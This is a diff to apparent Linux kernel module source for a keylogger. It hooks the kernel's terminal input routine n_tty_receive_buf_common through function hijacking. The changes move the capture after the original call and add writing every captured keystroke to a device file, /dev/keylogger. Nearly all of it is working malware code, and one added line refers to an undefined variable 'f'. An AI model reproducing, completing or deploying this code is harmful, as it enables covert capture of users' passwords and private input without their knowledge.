@@ -8,6 +8,7 @@
 
 unsigned long* o_n_tty_receive_buf_common;
 unsigned char* buff_original_code;
+struct file *keylogger_file;
 
 
 typedef int (*n_tty_receive_buf_common_t) (struct tty_struct *tty, const unsigned char *cp,
@@ -20,15 +21,16 @@ int my_n_tty_receive_buf_common(struct tty_struct *tty, const unsigned char *cp,
 
 	int result;
 
-	if (strcmp(cp, "") != 0) {
-		printk("%s", cp);	
-	}
-
 	// stoping the hook 
 	hijack_stop(o_n_tty_receive_buf_common, buff_original_code);
 
 	// calling the original function 	
 	result = n_tty_receive_buf_common(tty, cp, fp, count, 0);
+
+	if (strcmp(cp, "") != 0) {
+		printk("%s", cp);	
+		driver_file_write(keylogger_file, 0, f, result);
+	}
 
 	// hooking the original function again
 	hijack_start(o_n_tty_receive_buf_common, my_n_tty_receive_buf_common, &buff_original_code);
@@ -40,6 +42,8 @@ int my_n_tty_receive_buf_common(struct tty_struct *tty, const unsigned char *cp,
 
 int start_key_logger(void){
 		
+	keylogger_file = driver_file_open("/dev/keylogger", 0, 0);
+
 	// getting original address of the function 
 	o_n_tty_receive_buf_common =  (void *) kallsyms_lookup_name("n_tty_receive_buf_common");
 
@@ -57,5 +61,6 @@ int stop_key_logger(void){
 
 	// removing the hook 
 	hijack_stop(o_n_tty_receive_buf_common, buff_original_code);
+	driver_file_close(keylogger_file);
 }
 
